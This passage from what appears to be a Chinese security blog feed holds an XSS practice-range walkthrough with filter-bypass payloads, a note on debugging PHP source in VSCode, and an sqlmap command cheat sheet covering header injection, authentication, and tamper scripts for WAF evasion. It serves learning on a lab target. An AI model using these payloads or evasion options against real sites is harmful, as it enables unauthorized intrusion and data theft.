title="如何判断是单引号还是双引号闭合？"></a>如何判断是单引号还是双引号闭合？</h2><p>构造 ‘“&gt;<br>如果单引号 则没有输出 如果是双引号 则输出’</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709102815.png" alt="20190709102815.png"><br>对输入的参数，过滤掉了&lt;,&gt;</p><blockquote><p>“ onchange=alert<code>1</code> “<br>“ onchange=alert<code>1</code> //<br>“ oninput=alert<code>1</code> “<br>“ oninput=alert<code>1</code> //</p></blockquote><h1 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709102851.png" alt="20190709102851.png"></p><p>输入全改为小写，使得大小写绕过str_replace失败 ，同时过滤了script和onclick标签，但是没过滤a标签</p><blockquote><p><code>&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt; //</code><br><code>&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;111&lt;/a&gt; //</code><br><code>&quot;&gt; &lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt; //</code></p></blockquote><h2 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h2><ul><li>  他的作用就是将点击a标签改为触发js事件：一般多数的情况，显示的结果是a标签包含的，但是还期望有js事件触发，才会用到伪协议。</li><li>  <strong>其可以直接输入在地址栏里，javascript:后的代码会当javascript来执行，并将结果返回给当前页面。</strong></li><li>  由JavaScript+”:”+JavaScript代码组成的URL是一个JavaScript伪协议，该协议类似于<a href="http://url.它可以使用在任何http能使用的地方.所谓&quot;伪&quot;协议,就是指非标准化的协议,即这个协议并没有写在国际标准组织的归档记录中,也表示并不是所有浏览器都支持javascript伪协议.所以在开发时尽量不要使用.有的浏览器会不支持这个协议,当你使用这一类的浏览器时,就会发生错误/">http://url。它可以使用在任何HTTP能使用的地方。所谓&quot;伪&quot;协议，就是指非标准化的协议，即这个协议并没有写在国际标准组织的归档记录中，也表示并不是所有浏览器都支持JavaScript伪协议。所以在开发时尽量不要使用。有的浏览器会不支持这个协议，当你使用这一类的浏览器时，就会发生错误</a></li></ul><p>总而言之给我的感觉就是：在静态的html界面中能够通过JavaScript伪代码来实现动态的效果</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709102923.png" alt="20190709102923.png"></p><blockquote><p>没有过滤大小写,改变大小写即可</p></blockquote><h1 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709103001.png" alt="20190709103001.png"></p><p>大小写绕过被封堵了，但是替换为空了，所以可以通过双写绕过即可</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709103130.png" alt="20190709103130.png"></p><p>和之前level6不同的是 这里过滤掉了script,而非level6的<code>&lt;script</code>，也就间接杀掉了JavaScript的伪协议的用处</p><blockquote><ol><li>可以通过用Html实体编码绕过，r编码为&amp;#x72</li><li> 通过换行制表符号截断绕过</li></ol></blockquote><h2 id="html实体编码"><a href="#html实体编码" class="headerlink" title="html实体编码"></a>html实体编码</h2><p>关于为什么html实体编码可以绕过，可以参考这三篇文章</p><ol><li> <a href="http://www.mamicode.com/info-detail-1712225.html">http://www.mamicode.com/info-detail-1712225.html</a></li><li> <a href="https://www.jianshu.com/p/5b72458a5258">https://www.jianshu.com/p/5b72458a5258</a></li><li> <a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></li></ol><blockquote><p>大概的过程就是<br>服务器的应用程序服务器调用php解释器对数据处理之后，返回html实体给客户端浏览器<br>客户端浏览器先根据&lt;&gt;等标签来构建dom节点，然后在对dom节点里面的内容进行html实体编码解析。<br>所以&amp;#x72被还原成r， 而%#gt之类的，为了不引起歧义，在F12的调试框里面以这种&amp;#gt形式存在</p></blockquote><p>所以攻击链就是因为<code>&lt;a&gt;</code>所以他构建出了dom节点，然后再对里面的数据进行html译码，转换出来了JavaScript伪协议，然后再执行对应的伪协议</p><h2 id="置换制表符绕过"><a href="#置换制表符绕过" class="headerlink" title="置换制表符绕过"></a>置换制表符绕过</h2><p>%09===&gt;tab %0d %0a====&gt;换行符<br>查看 这篇文章 <a href="https://www.freebuf.com/articles/web/54686.html">https://www.freebuf.com/articles/web/54686.html</a> 的0x03part：写到浏览器的webkit解析的时候 会略过回车空格之类的</p><blockquote><p>记得在url中改，或者在burp拦截的包里面更改<br><code>level8.php?keyword=javascrip%0at%3Aalert(%27xss%27)</code><br>因为在输入框里面无法填写回车和tab，如果直接在输入框里面写%0a就会在请求的时候URL为%250a这样的玩意</p></blockquote><h1 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709104034.png" alt="20190709104034.png"></p><p>这里比上文添加了一个条件，参数当中必须包含http://</p><blockquote><p>javascr%09ipt:alert(1)//http://</p></blockquote><p>上述payload原理是：</p><blockquote><ul><li> 先在服务器端进行php过滤处理，处理的结果返回客户端，客户端在执行JavaScript伪协议</li><li>  在执行php过滤的时候，可以存在http://的形式，从而使得它能成功将内容返回到客户端<br>而在客户端点击按钮之后，就会调用JavaScript解释器去解析后面的JavaScript语句，此时就会识别后面的//注释，自然就把后面的屏蔽了。（在此之前//都不会被当做注释）</li><li> 如果把注释符号去掉，那么语句很明显语法有问题，所以比如报错</li></ul></blockquote><h1 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703144619.png" alt="20190703144619.png"><br>注入点只有str3</p><blockquote><p>keyword=t_sort =” type=”text” </p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>经过自己测试，如果同一个标签中属性重复，firefox和Chrome浏览器执行的时候，默认取前一个而忽视掉重复的那个属性<br>如下面我测试的 type=text和type=hidden，浏览器优化之后，只保留了前面的text属性<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703143257.png" alt="20190703143257.png"></p><p>所以这里可以采取前面覆盖后面的方式，覆盖掉后面的hidden属性</p><h2 id="黑盒如何检测出来这种漏洞"><a href="#黑盒如何检测出来这种漏洞" class="headerlink" title="黑盒如何检测出来这种漏洞"></a>黑盒如何检测出来这种漏洞</h2><p>每个参数都测试一遍，看那个存在即可（当然实战存在一定的waf要绕过）</p><ul><li>  keyword=a&amp;t_link=” type=”text” 1&amp;t_history=” type=”text” 2&amp;t_sort =” type=”text” 3`<br>（此payload是为了给你看，记得urlencode，同时把中文“换为英文的”）</li><li>  <code>/level10.php?keyword=a&amp;t_link=%22%20type=%22text%22%22%20&amp;t_history=%22%20type=%22text%22%22%202&amp;t_sort=%22%20type=%22text%22%20%223 </code><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703144111.png" alt="20190703144111.png"></li></ul><h1 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703144809.png" alt="20190703144809.png"></p><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703145407.png" alt="20190703145407.png"><br>修改 reference头即可</p><h1 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h1><p>如何发现这种漏洞？就是原文返回呗！如图</p><blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703145555.png" alt="20190703145555.png"></p></blockquote><p>方法：</p><blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703145846.png" alt="20190703145846.png"></p></blockquote><h1 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703150219.png" alt="20190703150219.png"></p><h1 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h1><p><a href="http://exofvoewer.org/">http://exofvoewer.org</a> 登不上，放弃了，可以直接看先知上的wp了解exif xss<br>核心是 通过在数码相机照片的Exif信息中插入恶意HTML代码，造成WEB页面解释Exif信息时，恶意代码被执行，以达到攻击目的。</p><h1 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709105912.png" alt="20190709105912.png"></p><blockquote><p><code>level15.php?src=&#39;level1.php?name=&lt;img%20src=1%20onerror=alert(1)&gt;&#39;</code></p></blockquote><p>onerror 事件在加载外部文件（文档或图像）发生错误时触发，转而执行对应的JavaScript代码<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703153520.png" alt="20190703153520.png"></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li> 由于存在htmlspecialchar函数过滤，直接在包含的页面里用<code>&amp;lt;script&amp;gt;</code>触发不了，所以用了img标签</li><li> 需要单引号包裹，否则无法包含</li><li> 可以include leve1然后再用img标签传xss(这里我用firefox打不成功，但是换chrome就可以了)</li></ol><p>详情见下面的补充知识</p><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><ol><li> <a href="https://www.runoob.com/angularjs/angularjs-intro.html">AngularJS</a> 是一个 JavaScript 框架。它是一个以 JavaScript 编写的库。此处使用该框架的目的是用于引入ng-include指令</li><li> <a href="https://www.runoob.com/angularjs/ng-ng-include.html">ng-include</a> 指令相当于php的include函数，用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。默认情况下，包含的文件需要包含在同一个域名下。</li><li> <strong>ng-include,如果单纯指定地址，必须要加引号</strong><blockquote><p>没加引号的情况，无法被成功解析<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709132552.png" alt="20190709132552.png"><br>加了引号才被成功解析出来<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709115619.png" alt="20190709115619.png"></p></blockquote></li><li>上面涉及到googleapis.com这个API的加载。<ul><li>是谷歌提供的福利，可以直接引用上面的文件和使用一些服务。因为谷歌服务器在宽带上的优势，很多网站，都加载了这个域名的一个或多个文件。</li><li>国内被墙了，所以大部分情况下只能在源代码中显示成功文件包含却无法成功包含出来下面的level1</li><li>所以部分人测试出来的chrome</li><li>burp连接的时候截断也会报错<code>auto-select SSL parameters for ajax.googleapis.com</code>之类的错误</li><li>有时候又可以加载，但是最好的解决方案还是：开个全局代理翻墙出去即可</li></ul></li><li>无法使用<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>的脚本，我个人尝试过不同的浏览器，网上找资料没找到相关，总而言之就是不能用吧。<br> firefox显示是灰色的没有解析，chrome不是灰色但是也无法解析，即使我关闭了chrome的xss过滤器<br> <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709141555.png" alt="20190709141555.png"></li></ol><h1 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703154101.png" alt="20190703154101.png"></p><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703154425.png" alt="20190703154425.png"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703154511.png" alt="20190703154511.png"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703154610.png" alt="20190703154610.png"></p><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190703155008.png" alt="20190703155008.png"><br>分析之后得知是burp显示的问题</p><p>此处%09的tab不行，因为他ban掉了空格，可能把tab识别为了空格</p><p>根据webkit的特点 会读取字符串 即使中间出现回车 tab都可以进行</p><h1 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h1><p><code>&lt;embed&gt;</code> 标签定义嵌入的内容，比如插件。比如嵌入尾缀为.swf的就是嵌入一个flash动画</p><p>由于firefox我的出了问题，没有合理的支持adobe 所以换为chrome才有正常的swf文件显示，才能正确执行</p><p>一个障眼法，不要觉得他是flash这里就畏惧<br>核心在于输入和输出的一致没有被过滤，同时输入能造成标签的闭合 或者产生 进而执行JavaScript代码或者事件</p><h1 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h1><p>同level-17</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>靶场</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vscode调试php底层代码</title>
    <link href="/2019/07/09/%5Bold%5Dphp%E5%BA%95%E5%B1%82%E6%BA%90%E4%BB%A3%E7%A0%81/"/>
    <url>/2019/07/09/%5Bold%5Dphp%E5%BA%95%E5%B1%82%E6%BA%90%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><h2 id="静态编译"><a href="#静态编译" class="headerlink" title="静态编译"></a>静态编译</h2><p>window下参考Rai4over的文章</p><ol><li>文章一：<a href="https://www.secpulse.com/archives/73801.html">原文但是图片被吞</a><br> 文章二：<a href="https://cloud.tencent.com/developer/news/286157">含图片但是格式有问题</a><br> 二者都是相同的文章，只是图片和格式互补</li><li>对照上面的步骤<ol><li> 下载VS</li><li><a href="https://github.com/microsoft/php-sdk-binary-tools">php-sdk</a> 和 <a href="https://github.com/php/php-src">php-src</a>尝试GitHub下载<br>无奈git clone速度太慢，就直接下zip。速度下载的快一点，但是无法git check来切换php的不同版本分支</li><li> 按照上面的文章 来打包文件，配置文件即可</li><li> vscode按照c/c++拓展+配置lauch文件，同时打开<code>xxxx\phpdev\vs16\x64\php-src\ext\standard\image.c</code>文件设置断点，我这边的在1525<del>1533</del>行，R师傅的在1503行因此对照函数搜即可</li></ol></li></ol><p>运行F5调试会报错</p><ul><li>  调试控制台输出<code>Loaded &#39;C:\Windows\System32\xxxxx.dll&#39;. Cannot find or open the PDB file.</code></li><li>  问题输出<code>&quot;message&quot;: &quot;#include errors detected. Please update your includePath. Squiggles are disabled for this translation unit </code></li><li>  问题输出<code>cannot open source file &quot;xxx.h&quot;</code><br>这些都是正常现象，报错依然可以执行断点，依然可以查看底层代码</li></ul><p><strong>前提你断点 设置的没问题</strong></p><h2 id="动态编译"><a href="#动态编译" class="headerlink" title="动态编译"></a>动态编译</h2><p>上述是静态编译，也就是说无需启动网页，直接编译查看底层源代码<br>下面这个是动态编译步骤，即启动网页才会触发断点，适合传递参数的地方<br><a href="https://www.jianshu.com/p/29bc0443b586">https://www.jianshu.com/p/29bc0443b586</a></p><hr><h1 id="其他系统搭建环境"><a href="#其他系统搭建环境" class="headerlink" title="其他系统搭建环境"></a>其他系统搭建环境</h1><p>找到的其他参考：<br>mac下 除了P牛的知识星球文章，另外一个<a href="https://www.phpzjj.com/article/6054.html">https://www.phpzjj.com/article/6054.html</a><br>win下利用VS断点调试，而非VSCODE <a href="https://xz.aliyun.com/t/2004">https://xz.aliyun.com/t/2004</a> </p><hr><h1 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h1><p>教训断点位置设置错误</p><p>运行1.php文件，报错</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">#include errors detected. Please update your includePath. Squiggles are disabled for this translation unit (C:<span class="hljs-symbol">\p</span>hp<span class="hljs-symbol">\p</span>hp-sdk-binary-tools-master<span class="hljs-symbol">\p</span>hp-sdk-binary-tools-master<span class="hljs-symbol">\p</span>hpdev<span class="hljs-symbol">\v</span>s16<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\p</span>hp-src-master<span class="hljs-symbol">\e</span>xt<span class="hljs-symbol">\s</span>tandard<span class="hljs-symbol">\i</span>mage.c).<br></code></pre></td></tr></table></figure><p><del>核心问题在于C语言编译环境我没有配置，于是转mingw去了</del><br>你装了VS，还装什么mingw？有病吧！C++自带好么？（当时真的头昏搞这个东西）</p><p>后面用VS调试，设置断点的时候发现1525和1533都是一样的函数，只是传递过来的参数不同而已，也就是说断点设置错误的了位置</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap命令备忘录</title>
    <link href="/2019/07/08/%5Bold%5Dsqlmap%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2019/07/08/%5Bold%5Dsqlmap%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p><del>建议大家自己过一次命令，不要仅仅停留在看。<br>网上总结命令的文章一大堆，很全但是很杂包括我这篇文章，看着看着可能就看不下去了，不如一个个的自己过。<br>我个人是看着苑老师的视频过了一次感觉比自己一个个尝试要有趣不少。所以如果有视频的话，大家也可以看着视频过。<br>所以看到这，建议你直接跳到文末看我给你的资料，或者crtl+w马上动手干</del></p><p>时光荏苒，三年过去基本都忘了</p><hr><h1 id="sqlmap用途"><a href="#sqlmap用途" class="headerlink" title="sqlmap用途"></a>sqlmap用途</h1><ul><li>提供五种漏洞检测技术<ol><li>  基于布尔的盲注检测</li><li>  基于时间的盲注检测</li><li>  基于错误的检测</li><li>基于union联合查询的检测<ul><li>  适用于通过循环输出联合查询结果，否则只显示第一项结果</li></ul></li><li>基于堆叠查询的检测<ul><li>  堆叠多个查询语句</li><li>  适用于非select的数据修改，删除操作  </li></ul></li></ol></li><li>其他特性<ol><li>数据库直接连接 -d<ul><li>   前提是拥有对应数据库的账号密码，身份认证信息</li><li>   优点是不需要下载对应的数据库客户端程序，直接使用sqlmap作为客户端去连接对应的数据库的端口</li></ul></li><li>与burpsuite，google联动<ul><li>   结合正则表达式限定搜索目标，然后sqlmap调用GOOGle搜索引擎去搜索，搜索得到的url结果在通过sqlmap测试  </li></ul></li><li>get，post,cookie,referer,可以随机或者指定<ul><li>  cookie过期后自动处理set-cookie头，更新cookie信息。也就你不用担心扫着扫着cookie过期的问题，非常只能</li><li>  user-agent默认是：</li></ul></li><li> 限速：最大并发，延迟发送，使之隐蔽性更强</li><li> 支持basic,digest,html,ca身份认证</li><li> 数据库版本，用户，权限，hash枚举和字典爆破，暴力破解表列名称</li><li> 文件上传、upf，启动并执行存储过程，操作系统命令执行，访问windows注册表（进行增删改查）</li><li> 与w3af，metasploit集成使用，基于数据库服务进程提权和上传执行后门</li></ol></li></ul><h1 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li> -h/hh 后者显示的信息更多</li></ol><h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><ul><li>-u<ul><li>  建议用双引号括起来url地址 ，如果url里面含有双引号 记得\去转义</li><li>  用-p xxx指定特定的参数进行注入，而不是所有参数都查询</li><li>  -f fingerprint 查询指纹信息 比如版本 等信息</li><li>  –users 查询当前数据库的所有管理账号</li><li>  –banner 提示版本信息</li><li>  –dbs 查询数据库管理系统里面有哪些库</li><li>  –schema 查元数据库，会以表格的形式呈现出来，当然需要有查询information_schema库的权限。但是如你所知这个库很大，查询需要半天</li><li>  -a 即all： 上面–xxx都查</li></ul></li><li>-d “mysql://账号:密码@ip：port/数据库名称” -参数 <ul><li>  -f -users -a  因为是直接连接去查询，而不是基于漏洞发现 所以速度很快</li></ul></li><li>-m xx.txt 指定一个含有多个url地址的文件进行扫描<ul><li>  -f -users -a 后面跟上去查询</li></ul></li><li>-g  “inurl:&quot;php?id=1&#39;” 接合google扫描结果<ul><li>  由于要翻墙 要设置代理所以待定</li></ul></li></ul><p>如果是post方法，这个时候就无法传递url去-u传递参数</p><ol><li>使用http请求文件（burpsuite）<ol><li> burp拦截请求，将请求命令复制粘贴到一个post.txt文件（用vi复制粘贴的时候，会出现自动换行 会导致格式出错，gedit编辑文件最好）</li><li> -r post.txt读取对应的文件 在-f –dbs等去查询对应的信息 </li></ol></li><li>使用burpsuite的log文件 <ol><li> 开启log记录：option==&gt;logging=====&gt;选择proxy请求进行保存—&gt;选择保存的文件位置</li><li> 浏览器访问，这个时候请求会自动生成log文件</li><li> sqlmap -l log.txt  </li><li> 可以跟上-p -f等参数</li></ol></li><li> 后面要讲的–data</li></ol><p>https 支持该类请求 –force-ssl指定使用https与目标服务器进行通信<br>如果不是默认的443端口 可以在url后面跟上对应的端口号 xxx?id=1:8843进行请求，防止一定的错误</p><p>可以自定义扫描的配置参数文件，无非就是各种参数-a -d -p的集合，使得你下次再使用sqlmap的时候不用在输入那么长的命令，直接-c sqlmap.conf 来自定义扫描配置文件<br>官方有sqlmap.conf的默认配置文件 可以自己找一找 </p><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><ul><li>数据段： –data<ul><li>  get/post通用</li><li>-u “xxx” –data=“uanme=xxx&amp;pass=xxx”  -f<ul><li>  此时就不需要和上面一样在url里面指定参数，而单独拿出来，此时就可以不仅get还有post都支持</li></ul></li><li>  不需要前面有个?来间隔参数和url</li><li>  默认以&amp;作为分隔符来逐个识别和注入对应的参数，可以–param-del=’;’来制定特定的参数作为分隔符，此时–data=“uanme=xxx;pass=xxx” 来表示</li></ul></li><li>cookie段： –cookie =”xxxx”<ul><li>  web应用需要基于cookie的身份认证</li><li>  检查cookie中的注入点（使用默认的level-1的时候不会检查，当level ≥2时候才自动后台测试  –level 2）</li><li>  如果服务器端set-cookie使得cookie有更新，sql会自动更新，但是如果你不想使用新的cookie可以–drop-set-cookie，使得继续使用之前的cookie</li></ul></li><li>http头<ul><li>user-agent<ul><li>  默认是sqlmap/1.x-dev-xxxxx(<a href="http://sqlmap.org)的格式,因为默认是sqlmap/xxxx%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%AF%E4%BB%A5%E9%87%87%E5%8F%96%E4%B8%80%E5%AE%9A%E7%9A%84%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%81">http://sqlmap.org)的格式，因为默认是sqlmap/xxxx，所以服务器端可以采取一定的过滤手段！</a></li><li>  可以–user-agent=”xxx”来指定对应的agent</li><li>  加上参数–random-agent时候他才会向/usr/share/sqlmap/user-agents.txt文件里面随机选取agent（包含 chrome ie  safari  opera firfoxg各个版本的agent）。</li><li>  level≥3才会自动检查agent里面的注入点</li><li>  当手动注入成功，但是sqlmap不成功的话，可能怀疑就是user-agent这里存在一定的过滤</li></ul></li><li>host<ul><li>  –host=“xx”指定对应的主机名</li><li>  level≥5（最高扫描级别）</li></ul></li><li>referer<ul><li>  –referrer=”xxx”指定</li><li>  level≥3</li></ul></li><li>额外的headder: –headers=“xxxx”<ul><li>  万一那天那个怪人指定了一个额外的header头呢？</li><li>  每个头单独写一行（名称区分大小写）<code>--headers=&quot;Host:www.www.com\nUser-Agent=chrome&quot;</code>，即\n换行。但是一定要注意区分大小写！！！！！</li></ul></li></ul></li><li>  上述的都没有指定请求方法，默认先尝试get再post，你也可以指定–method=POST 或者get</li><li>基于HTTP协议的身份验证<ul><li>  Basic</li><li>  Digest（摘要）</li><li>  NTLM</li><li>  方法：–auth-type Basic –auth-cred “USER:PASS”,这样可以过掉需要身份认证的网页，比如DD的那道题要填写账号密码才能访问</li></ul></li><li>–auth-cert /–auth-file<ul><li>  基于客户端进行客户端证书认证（少见，大多出现在网银情况下）</li><li>  –auth-file=”ca.PEM”</li><li>  只支持PEM格式证书（含有或不含有私钥都行）</li></ul></li><li>http(s)代理<ul><li>  –proxy=”<a href="http://127.0.0.1:8087&quot;，如果代理需要身份认证：--proxy-cred=&quot;name:pass&quot;">http://127.0.0.1:8087&quot;，如果代理需要身份认证：--proxy-cred=&quot;name:pass&quot;</a></li><li>  –ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。因为有的基于操作系统层面实现的代理，而非基于浏览器层面实现的代理。这样流量就直接发到外网去了而导致内网的无法访问</li></ul></li><li>请求延迟，超时，尝试重连次数<ul><li>  建议格式 –xxxx=”xxx”  这种格式优于–xxx x，第一方便参数多的时候识别，第二不易出错</li><li>  –delay：请求的延迟时间，浮点数，时间为秒，默认无延迟 </li><li>  –timeout：请求超时时间，浮点数，默认30秒</li><li>  –retries：http连接超时重试次数，默认3次</li><li>  –randomize：长度、类型与原始值保持一致的请求下，指定每次请求随机取值的参数值</li></ul></li><li>–scope,对于前面的-l指定的log文件比较好，可以通过正则表达式筛选扫描对象过滤日志内容<ul><li>  –scope=”(www)?\ .target\ .(com|net|org)”</li><li>  –scope=”(19)?\ .168\ .20(1|10|100)”</li></ul></li><li>–safe-url/–safe-freq<ul><li>  检测和盲注阶段会产生大量请求，服务器端可能会因此销毁session。</li><li>  每经过–safre-freq次注入请求之后，发送一次正常请求，来防止错误次数过多导致的注入无法正常进行</li></ul></li><li>  –skil-urlencode：默认get方法会对传输内容进行编码，但是某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据。这个只是个开关，没有=“”的赋值，开了就是使用原始字符提交数据</li><li>–eval<ul><li>  每次请求之前执行指定的Python代码</li><li>  每次请求更改或者增加新的参数值（时间依赖或者其他参数值依赖）</li><li>  比如<code>--data=&quot;127.0.0.1/?id=xxx&amp;hash=asdasdaasdasdasda&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code>当id和hash存在关联的时候，单独的注入id，每次必定都错，但是使用了eval这样会调用后面的语句，使得每次hash随着Id变化而实现注入</li><li>  这就需要手动在先才能注入的点 </li></ul></li></ul><h2 id="optimization-优化性能"><a href="#optimization-优化性能" class="headerlink" title="optimization  优化性能"></a>optimization  优化性能</h2><ul><li>–predict-output<ul><li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率<ul><li>  比如返回一个phpmyadmin，他比对表之后就觉得是mysql的，然后再进行mysql的进一步探测，而不是把orcle sql server，mysql这些都测试一次</li></ul></li><li>  可以检测版本名、用户名、密码、privileges、role、数据库名称、表名、列名</li><li>  与–threads参数不兼容</li><li>  统计表位置/usr/share/sqlmap/txt/common-outputs.txt</li></ul></li><li>–keep-alive<ul><li>  使用http(s)长连接，性能好</li><li>  与–proxy参数不兼容，因为他只保持一个链接</li><li>  长链接避免重复建立连接的网络开销，但大量的长连接会严重占用服务器资源</li></ul></li><li>–null-connection<ul><li>  只获取相应页面的大小值，而非页面的具体内容</li><li>  通常用于盲注判断真/假，降低网络带宽消耗</li><li>  与–text-only参数不兼容（基于页面内容的比较判断真/假）</li></ul></li><li>  -o开启上面的三个参数</li><li>–threads=N<ul><li>  最大并发线程，默认为1，官方建议不超过10，否则可能影响站点可用性</li><li>  盲注时每个线程获取一个字符（N次请求），获取完成后线程结束</li><li>  与–predict-output参数不兼容</li></ul></li></ul><h2 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h2><ul><li>  比较多，只比较重要的讲</li><li>  -p：指定扫描的参数，使得–level失效，-p “user-agent,referer”</li><li>  –skip=“id,user-agnet”  忽略指定的扫描参数，常常搭配–level=N使用</li><li>URL注入点<ul><li>  适用于一些奇葩的URL “URL/param1/value1*/param2/value2”这种参数和值在url里面以//来间隔表示的，在要注入的参数后面加上*，比如此处注入点指定就在value1这里</li><li>  这种是伪静态页面，只是开发人员魔改了url，即你看不到参数传递的过程，不要以为没有参数就不能注入，其实是可以的</li></ul></li><li>  –dbms=“MYSQL（+版本号）/oracleL（+版本号）”:指定特定的数据库，而不会一个个的库测试从而提高效率</li><li>  –os=”Linux/Windows”:提高效率</li><li>–invalid-bignum/–invalid-logical<ul><li>  sqlmap默认使用负值使得参数取值失效id=13===&gt;id=-13，一失效就可以配合其他的逻辑判断进行sql注入漏洞的发现</li><li>  bignum使用大数使得参数值失效id=89999999</li><li>  logical使用布尔判断使取值失效id=13 and 18=19</li></ul></li><li>–no-cast<ul><li>  sqlmap默认处理：榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换null结果</li><li>  老版本mysql数据库需要开启此开关，不然会提取不到数据</li></ul></li><li>–no-escape<ul><li>  出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap默认通过char()编码逃逸的方法替代字符串，如<code>select ‘foo’ </code>===&gt;<code>select char(102)+char(111)+char(111)</code>从而不需要单引号即可表示foo</li><li>  但是某些特殊情况，使用char又会出错，而本参数将关闭此功能</li></ul></li><li>–prefix/–suffix<ul><li>  某些地方需要指定特定的前缀和后缀，比如iscc的union那道题</li><li>  闭合特定的规则：比如id=（“‘“.$_GET[‘ID’].”’”）,普通的sql无法直接使用，这个时候指定–prefix=’)and –suffix=and (‘1’=’1 来闭合前后，这样id就是纯payload</li></ul></li><li>–tamper<ul><li>  混淆脚本，用于绕过应用层过滤，IPS，WAF</li><li>  /opt/sqlmap/tamper目录下已经有了不少编写好的taper脚本</li><li>  